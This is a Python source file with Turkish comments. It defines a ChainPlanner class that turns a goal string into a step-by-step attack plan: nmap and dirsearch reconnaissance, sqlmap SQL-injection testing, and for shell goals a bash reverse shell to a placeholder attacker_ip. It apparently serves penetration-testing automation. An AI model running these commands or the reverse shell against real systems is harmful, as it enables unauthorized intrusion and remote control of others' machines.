class ChainPlanner:
    @staticmethod
    def plan(goal: str) -> list:
        """
        Kullanıcının verdiği hedef/niyet stringine göre zincir planı oluşturur.
        Her adım dict formatında döner:
        {
            "step": int,
            "action": str,
            "suggestion": str,
            "notes": str
        }
        """
        goal = goal.lower()
        chain = []

        # Web uygulaması hedefi
        if "web" in goal:
            chain = [
                {
                    "step": 1,
                    "action": "Recon",
                    "suggestion": "nmap -sS -Pn target",
                    "notes": "Port keşfi"
                },
                {
                    "step": 2,
                    "action": "Enumeration",
                    "suggestion": "dirsearch -u http://target",
                    "notes": "Dizin keşfi"
                },
                {
                    "step": 3,
                    "action": "Exploit",
                    "suggestion": "sqlmap -u http://target --batch",
                    "notes": "SQLi test payloadları"
                }
            ]

        # Shell hedefi
        if "shell" in goal:
            chain.append({
                "step": len(chain) + 1,
                "action": "Post-Exploitation",
                "suggestion": "bash -i >& /dev/tcp/attacker_ip/4444 0>&1",
                "notes": "Reverse shell payload"
            })

        # Varsayılan zincir (hiçbir eşleşme yoksa)
        if not chain:
            chain = [
                {
                    "step": 1,
                    "action": "Recon",
                    "suggestion": "nmap -sV target",
                    "notes": "Servis keşfi"
                }
            ]

        return chain
